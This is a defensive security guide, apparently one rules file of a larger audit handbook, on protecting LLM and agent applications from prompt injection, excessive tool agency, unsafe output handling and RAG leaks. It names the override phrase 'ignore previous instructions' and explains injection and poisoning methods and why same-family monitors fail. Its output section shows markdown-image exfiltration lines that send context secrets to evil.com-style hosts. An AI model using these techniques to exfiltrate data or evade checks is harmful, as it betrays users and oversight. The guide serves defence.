# 08 — LLM & AI Application Security

Scope: prompt injection boundaries, tool-call authorization, model-output
handling, RAG/data-plane risks, agent loop containment.
Maps to OWASP LLM Top 10 2025 (LLM01 Prompt Injection, LLM05 Improper Output
Handling, LLM06 Excessive Agency, LLM08 Vector/Embedding Weaknesses) and the
OWASP Top 10 for Agentic Applications 2026 (ASI01 Agent Goal Hijack, ASI02 Tool
Misuse, ASI05 Unexpected Code Execution, ASI06 Memory & Context Poisoning,
ASI07 Insecure Inter-Agent Communication), CWE-77/94/441/863 analogues. Use
both lists when auditing tool-using agents; the agentic list's core principle —
**least-agency**: grant the minimum autonomy the task needs — is this file's §1–2
in one word.

Core principle: **the model is an untrusted interpreter that executes natural
language.** Anything that reaches the context window — user messages, retrieved
documents, web pages, tool results, file contents — is potential instruction.
There is no reliable in-band defense; security comes from *out-of-band*
architecture: what the model is allowed to do, see, and emit is enforced by
code around it, never by the prompt itself.

## 1. Prompt injection boundaries (LLM01)

- Assume injection succeeds. Design question: "when (not if) the model obeys
  attacker text, what can it actually do?" Bound that blast radius first.
- **Direct injection** (user typing "ignore previous instructions") matters
  mostly when the prompt guards something — never put secrets, hidden business
  rules, or authorization decisions in the system prompt; assume full prompt
  disclosure (LLM07). Plant a unique canary string in each system prompt and
  alert when it appears in output, logs or anywhere outside (confirmed leak,
  `sota-detection-engineering` rules/02 and rules/05). The canary only detects a
  leak. It never makes a secret in the prompt acceptable. OWASP: LLMSVS 5.7, LLMSVS 8.2.
- **The server owns the prompt.** The server builds the system prompt and assembles
  the full prompt; an LLM endpoint accepts the user's turn and nothing else — never a
  `system` field, a whole `messages` array, a template, or any role other than `user`
  from the client. Accepting one lets every caller rewrite the instructions. Anonymous,
  trial and preview access to an LLM feature is still metered work: authenticate it,
  or give it its own quota with tighter limits than paid tiers (denial-of-wallet,
  rules/06 §5). OWASP: LLMSVS 5.2, LLMSVS 5.17.
- **Indirect injection** is the serious one: instructions embedded in content
  the model processes — web pages, emails, PDFs, code comments, calendar
  invites, RAG chunks, prior tool output. Any pipeline where the model reads
  third-party content and can then *act* (tools) or *render* (output to user)
  is the attack path. Give an agent only the files and content its task needs,
  since everything else is extra injection surface. After it has processed
  content from outside contributors or public repositories, review its changes
  and actions before accepting them (`sota-sandboxing` rules/05 §7). OWASP:
  Secure Coding with AI cheat sheet.
- **Every modality carries instructions.** Text drawn into an image (tiny, low-contrast,
  off-canvas), spoken audio, video frames, document metadata (EXIF, PDF and Office
  properties, alt text), hidden layers and white-on-white text, and steganographic
  payloads all reach a multimodal model. Whatever you derive from them — OCR output,
  captions, transcripts, extracted metadata — is tainted exactly like a retrieved chunk:
  same data framing, same taint gate. Screen inputs **together** as well as one at a
  time: an image holding the instruction and an innocent-looking text turn that
  triggers it each pass a filter that sees only its own input. OWASP: AISVS 2.2.3,
  AISVS 2.2.4, LLM Prompt Injection Prevention cheat sheet.
- Structural mitigations (stack them; none is sufficient alone):
  - **Privilege separation by context**: untrusted content goes in delimited
    data sections with explicit "this is data, not instructions" framing, and —
    stronger — separate model calls: a quarantined call summarizes/extracts
    from untrusted content with **no tools**, returning structured data; only
    the trusted-context call gets tool access (dual-LLM pattern).
  - **Capability gating on taint**: once a session/agent has ingested untrusted
    content, downgrade what it may do (e.g. can no longer call
    send_email/exfiltrate-capable tools) — taint tracking at the orchestrator.
  - Prompt-injection classifiers/heuristics as telemetry and friction, not as
    the security boundary. Tier them by cost. On every turn, run cheap checks:
    normalise (rules/09 §4), collapse repeated whitespace and characters, cap
    length, decode Base64, hex and LaTeX-hidden text in remote content so the
    screen sees the payload, then fuzzy-match known phrases (a Levenshtein-class
    metric, threshold precomputed at startup, which catches scrambled-letter
    "typoglycemia" spellings). Put classifiers, content-category scores and
    many-shot detection (a prompt stuffed with fake dialogue turns) on untrusted
    content and tool calls. They cut attack volume. Only orchestrator
    enforcement bounds what an injection can do. OWASP: AISVS 2.1.3, AISVS 2.1.8,
    AISVS 2.2.1, LLM Prompt Injection Prevention cheat sheet, RAG Security cheat sheet.
  - **Defang tool output before it enters context:** strip or escape
    instruction-shaped tags (`<system>`, `<instructions>`, `<IMPORTANT>`) and
    invisible Unicode, and make web tools return extracted title and body text,
    not raw HTML with hidden elements. OWASP: MCP Security cheat sheet.
  - **A same-class checker is not an independent layer.** A classifier, judge, or
    "second opinion" tier drawn from the same model family as the system it
    guards shares that system's blind spots *by construction*: the inputs that
    slip past the primary are disproportionately the ones the checker also reads
    as benign. This is **common-cause failure** — two components that fail
    together do not multiply into defence in depth, however the diagram is drawn.
    **Escalate-only cascades are strictly worse**, and deductively so: a tier that
    only sees inputs the primary scored *uncertain* cannot see an input the
    primary scored confidently — and a confidently-wrong score is precisely the
    failure you needed caught. Its marginal recall on the hard class is bounded
    by the primary's uncertainty coverage, not by its own accuracy, so a better
    second model does not fix it.
    Therefore: **do not count such a tier as a layer in a threat model** until you
    have measured its marginal recall *on the hard class specifically* — the
    inputs the primary gets wrong — rather than on a mixed corpus where easy
    cases dominate the mean. A layer that adds nothing on the class you care
    about is a control that looks enabled and does nothing (rules/10 §1). The
    same reasoning applies to any guard sharing a substrate with the guarded
    system: the same model family, the same tokenizer, the same training corpus,
    or the same normalization step that produced the miss.
- The lethal trifecta to refuse by design: (a) access to private data +
  (b) exposure to untrusted content + (c) an exfiltration channel (tool that
  sends data out, markdown image rendering, link generation). Any agent with
  all three is exploitable; remove or gate one leg.

```python
# GOOD: orchestrator-level taint gating (illustrative)
class Session:
    tainted: bool = False           # set True when untrusted content enters context

def ingest(session, content, source):
    if source.trust != "first_party":
        session.tainted = True
    session.context.append(wrap_as_data(content, source))   # delimited, labeled

def allowed_tools(session):
    if session.tainted:
        return [t for t in session.tools
                if t.read_only and not t.exfil_capable]      # no send_email, no fetch_url
    return session.tools
```

- **Memory/persistence poisoning**: long-term agent memory, scratchpads, and
  "learned preferences" written while processing untrusted content become
  persistent injections replayed into every future session. Gate memory writes
  (human-visible, schema-constrained, provenance-tagged), and make memory
  user-scoped — one user's poisoned memory must never reach another's session.
- Multi-agent systems: each hop is a trust boundary. Agent B must not treat
  agent A's output as instructions-with-A's-privileges; propagate taint and
  the original human principal through the whole chain (rules/03 §6 deputy
  rules apply between agents). Message-level controls: §1a.

### 1a. Inter-agent and agent-tool messages (ASI07)

Whether multi-agent is worth its cost is `sota-llm-engineering` rules/04 §7; once you
have it, every message between agents, and every tool response, is input from a peer
whose compromise you must survive:

- **Registry, not discovery.** Keep a registry of agents: identity, trust level, the
  recipients each may address and the message types each may send. A message from an
  unknown sender, to an undeclared recipient, or of an undeclared type is rejected, not
  logged and processed.
- **Authenticate both ends, sign each message.** Mutual authentication on the channel
  (mTLS or workload identity) plus a signature over each message and each tool response.
  The signed envelope names sender, recipient, timestamp, a nonce and the protocol
  version; the receiver rejects a wrong recipient, a stale timestamp, a nonce it has seen
  (replay) and a version below the one negotiated (downgrade).
- **Schema-validate, then strip privilege.** Parse every message against its type's
  schema (unknown fields rejected). Fields a lower-trust peer may not set — a `system`
  role, tool grants, the principal, approval flags — are dropped, never forwarded.
- **Record who started it.** Each action carries `initiated_by` (human or agent) and the
  chain of agents behind it, and policy and approval read that field: an agent-initiated
  payment is not the same decision as one the user clicked.
- **Write the delegation policy down.** Which agent may hand which task to which agent,
  with scope shrinking at each hop (`sota-sandboxing` rules/05 R6.1). A delegation the
  policy does not list is refused.

OWASP: AISVS 9.5.5, AISVS 10.4.6, AI Agent Security cheat sheet, AML Sanctions AI Agent
Payments cheat sheet, DSOMM.

## 2. Tool-call authorization (LLM06 — excessive agency)

- **Authorization is enforced by the tool layer, never by the prompt.** "Only
  call delete_user for admins" in a system prompt is not a control. The tool
  executor checks the *human principal's* permissions on every invocation —
  the model's request is an unauthenticated suggestion (confused deputy,
  rules/03 §6: the agent is the deputy).
- Run tools with the **user's identity and scopes**, not a god-mode service
  account: propagate the *principal* (who the user is, their tenant, their
  scopes), not the bearer token they presented. An agent serving user A must
  be physically unable to read user B's data (tenant scoping at the data
  layer, rules/03 §5).
- **No token passthrough.** Never forward the token the caller presented to a
  tool, an MCP server or a downstream API. Get a separate token for each
  downstream audience — OAuth token exchange (RFC 8693, rules/03 §6) or an
  audience-restricted, down-scoped token. The MCP authorization spec (rev
  2025-11-25) makes this normative: an MCP server must accept only tokens issued
  for itself (RFC 8707 audience) and "MUST NOT pass through the token it
  received from the MCP client" to an upstream API. OWASP: AISVS 10.2.7.
- Least-capability toolset: expose the minimal tools per task; narrow
  parameters (e.g. `search_orders(customer_id=<bound from session>)` — the
  model never supplies the customer_id); read-only by default, mutation tools
  separate and gated.
- **Validate tool arguments like any untrusted input** — model output IS
  untrusted input (rules/01 applies in full): schema-validate, then apply the
  same SQLi/path traversal/SSRF/command-injection guards as for user input.
  A `fetch_url` tool needs the complete SSRF defense from rules/01 §5.
- **Check what leaves through tool arguments.** The executor is an egress point:
  reject arguments carrying credential-shaped values (cloud key IDs, token
  prefixes, PEM blocks, JWTs), flag base64 or hex blobs packed into URL paths
  and query strings, and cap argument size per tool — 40 KB in a `search` query
  is data leaving, not a search. Across MCP servers, tag each value with the
  server it came from and block, or send to approval, a value from server A
  (a credential above all) flowing into a call to server B. A gateway or proxy
  in front of every server is where that isolation is enforced; network egress
  control is the backstop (`sota-sandboxing` rules/05 §4). OWASP: AI Agent
  Security cheat sheet, MCP Security cheat sheet.
- Human-in-the-loop for irreversible/high-impact actions (payments, deletes,
  external sends, code execution): explicit confirmation showing the *actual
  parameters*, not the model's summary of them; batch approvals and
  "always allow" defeat the control — scope them narrowly.
- **Bind the approval to what executes, and fail closed.** The approval record
  names the actor (agent), the requester (human principal), the tool, the
  target, the *normalised* arguments, the context, a single-use nonce and an
  expiry, and the approval service signs or MACs it. The executor recomputes
  that binding from the call it is about to run and refuses on any difference,
  a reused nonce or an expired record: approving `transfer(10, to=A)` must not
  authorize `transfer(10000, to=B)`. The approver sees a risk level and a plain
  explanation beside the raw parameters. The impact class — read-only,
  reversible, reversible only by a third party, irreversible — comes from the
  tool registry, never from the model's account of the call, and in a chain the
  highest class of any step sets the gate. If approval validation, the policy
  lookup or the audit write errors or times out, the action does not run
  (rules/03 §1). OWASP: AISVS 9.2.3, AISVS 9.2.8, AISVS 9.2.10, AI Agent
  Security cheat sheet, AI-Powered Advertising Systems Security cheat sheet.
- Rate-limit and budget-limit per session: max tool calls, max spend, max
  loop iterations (agent loops are resource-exhaustion surfaces, rules/06 §5).
- Audit-log every tool invocation: principal, session, full arguments, result
  size, taint state — agent actions must be attributable and reconstructible.
  Bind each entry to the acting agent's identity and a per-request nonce, store
  sensitive arguments as a keyed hash (a bare hash of a guessable value is
  reversible), and key-chain the entries (rules/18). A multi-hop transaction
  carries a receipt signed over its intent hash that each hop verifies, then
  appends to. OWASP: AISVS 9.4.2, AML Sanctions AI Agent Payments cheat sheet.
- **A second opinion that fails differently.** For high-risk planned actions and
  gating yes/no LLM verdicts, add a reviewer beside the deterministic gate: a
  non-LLM rules floor, an intent check that sees only the original task and the
  proposed action (no untrusted context to inject through), or models of other
  families with disagreement sent to a human; §1's same-class test decides if it
  counts. OWASP: AISVS 9.2.6, AISVS 9.2.7, AI-Powered Advertising Systems
  Security cheat sheet, LLM Prompt Injection Prevention cheat sheet.
- **The manifest declares, the registry enforces:** each tool entry states its
  privileges, limits (time, memory, network, rate) and output schema, and the
  executor applies them from that entry. OWASP: AISVS 9.3.3, AISVS 9.3.4.

```python
# GOOD: executor-side enforcement, model never sees other tenants
def execute_tool(call, session):
    spec = TOOL_REGISTRY[call.name]              # unknown tool -> reject
    args = spec.schema.parse(call.arguments)     # strict schema, extra=forbid
    authorize(session.user, spec.permission)      # user's perms, not model's
    args = spec.bind_session_scope(args, session) # tenant/user ids from session
    if spec.high_impact: require_user_confirmation(session, spec, args)
    return spec.output_schema.parse(spec.run(args, session.user_creds, limits=spec.limits))
```

## 3. Output handling (LLM05 — improper output handling)

- Model output is **untrusted, attacker-influenceable data**. Every sink needs
  the corresponding defense:
  - Rendered in web UI → encode/sanitize like user content (rules/05 §1).
    Rendering model markdown as HTML without sanitization is stored XSS;
    **markdown image/link URLs are an exfiltration channel**
    (`![](https://evil.com/?q=<secrets from context>)`) — proxy or strip
    external images, allowlist link domains, CSP `img-src` as backstop.
  - Executed as code (codegen, "run this SQL", eval'd snippets) → treat as RCE
    by design: sandbox (no network, ephemeral FS, resource caps), review gates
    for anything persisted; never `eval` model output in the app process
    (CWE-94).
  - Used in queries/commands/paths → parameterize/validate exactly as rules/01.
  - Fed to another model or template → injection chains; keep the data/
    instruction separation at every hop.
```python
# GOOD: model markdown -> safe HTML (chat UI)
html = markdown_to_html(model_output)
html = DOMPurify_equivalent.sanitize(html, allow=BASIC_TAGS)   # rules/05 §1
html = rewrite_images(html, lambda src:
         PROXY_URL + sign(src) if allowed_image_host(src) else DROP)  # exfil channel
html = rewrite_links(html, require_scheme={"https"}, mark_external=True)
# plus CSP img-src 'self' proxy.example as the backstop (rules/05 §2)
```
- **Streaming does not skip this.** A chunk rendered on arrival reaches the DOM
  before any final pass, and a partial `![](https://evil.example/?d=` becomes a
  fetch a token later. Hold back an unclosed link, image or tag until it closes,
  or re-sanitize the whole buffer on each chunk and replace the rendered node.
  OWASP: LLM Prompt Injection Prevention cheat sheet.

```python
# GOOD: sandbox floor for model-generated code execution
run_in_sandbox(code,
    network="none",                  # or allowlist of package mirrors at build step
    fs=ephemeral_overlay(),          # nothing persists, no host mounts
    limits=dict(cpu_s=10, mem_mb=512, pids=64, wallclock_s=30),
    user="nobody", seccomp=STRICT_PROFILE)
# container alone is not a sandbox; gVisor/Firecracker-class isolation for hostile code
```

- Parse structured output strictly: schema-validate JSON tool calls/extractions
  (`extra=forbid`, types, ranges); on failure reject/retry — don't "best-effort
  repair" your way into accepting injected structure.
- Don't trust model self-reports: "I have verified the user is authorized" or
  fabricated tool results must have no effect — state lives in the
  orchestrator, decisions come from code.
- Content-safety/PII filters on output where the application demands it —
  applied post-generation in code, with the same redaction discipline as logs
  (rules/07 §2): model responses must not echo secrets present in context
  (keys, other users' data) — best fixed by not putting them in context. Also
  flag a wrong response language, a length far outside the route's norm,
  high-entropy or encoded runs (exfiltration, canary evasion) and a reproduced
  system prompt or numbered instruction dump. Check metadata and structured
  fields too, filter PII to the requester's own access, and on a hit return a
  generic refusal. OWASP: AISVS 7.3.1, AISVS 7.3.4, LLMSVS 5.6, LLMSVS 5.8,
  LLMSVS 5.9, LLM Prompt Injection Prevention cheat sheet, RAG Security cheat sheet.

## 4. RAG & data-plane risks (LLM08)

- Retrieval is an authorization surface: **enforce the querying user's ACLs at
  retrieval time** (filter by permitted doc IDs/tenant in the vector store
  query). Embedding-then-retrieving across tenants is a cross-tenant leak even
  if the model "promises" not to reveal it. Don't embed content the user
  population may never see, or partition indexes per tenant.
```python
# GOOD: ACL filtering happens in the vector store query, not after retrieval
results = vstore.search(
    embedding=embed(query),
    filter={"tenant_id": session.tenant_id,            # session-derived, rules/03
            "doc_id": {"$in": acl.readable_doc_ids(session.user)}},
    top_k=8)
# BAD: vstore.search(embedding, top_k=8) then "the model will respect permissions"
```

- Poisoning: anyone who can write to ingested sources (wikis, tickets, public
  web) can plant indirect injections or biased "facts". Ingest only from an
  allowlist of approved sources (unknown ones rejected), screen documents for
  retrieval manipulation (keyword stuffing, text aimed at many queries) before
  vectorisation, log every index insert, update and delete with the modifier's
  identity, and alert on an unexpected index-size change. Optionally watch
  embedding distribution, flag documents near many query clusters, and cross-check
  with a second embedding model. Provenance-tag chunks and surface citations so
  humans can verify. OWASP: AISVS 8.2.4, RAG Security cheat sheet.
- Membership/extraction: embeddings are not anonymization — vectors can be
  inverted approximately; protect vector stores like the source documents
  (encryption, access control, no public endpoints). An embedding endpoint that
  untrusted users or agents reach needs authentication, rate limits and quotas;
  for high-risk corpora weigh calibrated noise (`sota-privacy-compliance` rules/02
  §4). OWASP: RAG Security cheat sheet.
- **Self-hosted vector DBs ship auth-OFF by default** (Qdrant, among others):
  set an API key / JWT, enable TLS, and bind to an internal-only network — an
  exposed keyless vector endpoint is full corpus read/write (poisoning + theft).
  Restrict *write* access to the ingestion pipeline identity only, and hash each
  ingested document (e.g. SHA-256) so tampered/poisoned chunks are detectable
  and excludable at retrieval.
- Cache keyed on prompts must be principal-scoped (semantic caches returning
  user A's answer — containing A's data — to user B).
- **All serving-layer shared state is tenant-scoped, not only the response
  cache.** KV and prefix caches leak across tenants by timing (a hit is faster),
  so partition or salt them per tenant; vLLM's `cache_salt`, for one, mixes a
  per-request value into the block hash, which its docs describe as blocking
  latency-based inference of cached content. The same goes for plan and
  tool-result caches, pools of LoRA or per-tenant adapters (a request loads
  only its own tenant's adapter), and vector IDs, which must be unique per
  tenant (namespaced or server-generated) so one tenant's upsert cannot
  overwrite another's point. Never put a response containing restricted data or
  PII in a shared cache, and serve a cache hit only after the same ACL check
  and audit record as a fresh retrieval. OWASP: AISVS 5.3.1, AISVS 8.1.1,
  AI-Powered Advertising Systems Security cheat sheet, RAG Security cheat sheet.

Platform and supply-chain notes (formerly section 5) moved to [rules/23](23-llm-platform-supply-chain.md) §1 on 2026-09-25.

## 6. Audit grep starters

```text
f-string/template building prompts from request data with no data/instruction framing
tools=|functions=|tool_choice passed where context includes fetched/retrieved content
eval\(|exec\(|subprocess|os.system near model output / completion variables
dangerouslySetInnerHTML|innerHTML|v-html rendering completion/message content
markdown render of model output without sanitize/image-proxy step
vector_store.search|similarity_search without tenant/ACL filter argument
api_key|system_prompt containing credentials, internal URLs, or authz rules
torch.load\(|pickle.load on downloaded checkpoints (want: safetensors)
tool handlers reading user_id/tenant_id from model-supplied arguments
"ignore previous"/role-play guards in prompts standing in for code-level checks
mcpServers|\.mcp\.json|claude_desktop_config entries without version pin or definition hash
```

## Audit checklist

- [ ] Is there any path where third-party content (web, docs, email, RAG, tool results) reaches a model that holds tools or sensitive context — and if so, is it quarantined (no-tool call, taint-gated capabilities)?
- [ ] Does the architecture avoid the lethal trifecta (private data + untrusted content + exfiltration channel) per agent, or gate one leg?
- [ ] Are there zero secrets, credentials, or authorization rules living only in prompts?
- [ ] Is every tool call authorized in code against the human principal's permissions, with session-bound scoping (tenant/user IDs never model-supplied)?
- [ ] Are tool arguments schema-validated and passed through the full rules/01 input defenses (SSRF, path, SQL, command)?
- [ ] Do irreversible/high-impact actions require human confirmation displaying actual parameters, with per-session call/spend/iteration budgets?
- [ ] Is model output sanitized per sink — HTML-encoded/sanitized for UI, external markdown images blocked/proxied, never eval'd in-process, parameterized into queries?
- [ ] Is structured model output strictly schema-parsed with rejection (no lenient repair)?
- [ ] Does RAG retrieval enforce the caller's document ACLs/tenant in the store query, with provenance on chunks?
- [ ] Are prompt/completion logs redacted, and semantic caches principal-scoped?
- [ ] Is every tool invocation audit-logged with principal, arguments, and taint state?
- [ ] Are agent memory writes gated, provenance-tagged, and strictly user-scoped (no cross-user persistence)?
- [ ] In multi-agent chains, do taint and the human principal propagate across every hop?
- [ ] Is model-generated code executed only in network-isolated, resource-capped, ephemeral sandboxes?
- [ ] Are reasoning-token budgets capped per request with consumption-anomaly alerting (OverThink-class), and is untrusted content kept out of reasoning scaffolds (H-CoT/CoT hijacking)?
- [ ] Does every LLM endpoint build the system prompt and full prompt server-side, taking only the user turn from the client, and do anonymous/trial/preview paths carry auth or their own tighter quota (§1)? HIGH when a client-supplied `system` or `messages` reaches the model. Probe, reading each hit: `grep -rnE '(messages|system_?prompt|system)[[:space:]]*=[[:space:]]*(request|req|body|payload|params|data)[.[]' .`
- [ ] Is text extracted from images, audio, video and document metadata (OCR, captions, transcripts, EXIF) framed and taint-gated like retrieved content, and are inputs screened jointly as well as singly (§1)? HIGH when the model holds tools. Probe for extracted text interpolated straight into a prompt: `grep -rniE '(\{|\+[[:space:]]*)[[:alnum:]_.]*(ocr|caption|transcript|exif|alt_?text)' .`
- [ ] Do agents accept messages only from registered peers, over mutually authenticated channels, signed with recipient, timestamp and nonce, schema-validated with privileged fields stripped, under a written delegation policy (§1a)? HIGH when a peer can set a `system` role or approval flag. Probe for a role copied from a peer message: `grep -rnE 'role.?[[:space:]]*:[[:space:]]*[A-Za-z_][[:alnum:]_]*(\[|\.)' .`
- [ ] Is the caller's bearer token never forwarded to a tool, MCP server or downstream API, with a per-audience exchanged or down-scoped token instead (§2)? HIGH. Probe: `grep -rniE 'authorization.?[[:space:]]*[:,][[:space:]]*(request|req|ctx|context|incoming|r)[.[]' .` — each hit forwards an inbound credential until shown otherwise.
- [ ] Does the executor reject credential-shaped tool arguments, cap argument size, and block cross-MCP-server flow of credentials (§2)? HIGH on any credential found in recorded tool calls. Probe over tool-call audit logs: `grep -rnE '"(arguments|input|args)"[[:space:]]*:.*((AKIA|ASIA)[0-9A-Z]{12,}|(gh[pousr]_|github_pat_)[A-Za-z0-9_]{20,}|-----BEGIN [A-Z ]*PRIVATE KEY)' .` (extend with your secret scanner's patterns).
- [ ] Is each approval bound (signed/MAC'd) to actor, requester, tool, target, normalised arguments, nonce and expiry and re-verified by the executor, with the impact class from trusted metadata, the chain's highest class governing, and approval/policy/audit errors failing closed (§2)? HIGH. Probe for blanket approval switches: `grep -rniE '(auto_?approve|always_?allow|approve_?all|skip_?(confirm|confirmation|approval))[[:space:]]*[:=][[:space:]]*(true|yes|1)' .`
- [ ] Are KV/prefix caches, plan caches, adapter pools and vector IDs tenant-scoped, is restricted/PII output kept out of shared caches, and do cache hits pass the same ACL check and audit as fresh retrievals (§4)? HIGH on a cross-tenant cache. Probe for cache keys built from the prompt alone: `grep -rnE 'cache_?key[[:space:]]*=[[:space:]]*[[:alnum:]_.]*\((prompt|query|messages)[^,]*$' .`
- [ ] Is streamed model output sanitized and image/link-proxied while it streams, with incomplete constructs held back or the whole buffer re-sanitized per chunk (§3)? HIGH when the chat UI renders markdown. Probe for raw chunks appended to the DOM: `grep -rnE 'innerHTML[[:space:]]*\+=|insertAdjacentHTML[[:space:]]*\(' --include='*.js' --include='*.ts' --include='*.jsx' --include='*.tsx' --include='*.vue' .` (read each hit; it is a finding when the appended value is a model chunk).
- [ ] Is any classifier/judge/"second opinion" tier counted as a defence layer in the threat model **from the same model family** as the system it guards — without a measured marginal recall on the hard class (the inputs the primary gets wrong)? Common-cause failure; an escalate-only tier is bounded by the primary's uncertainty coverage and cannot see a confidently-wrong score.
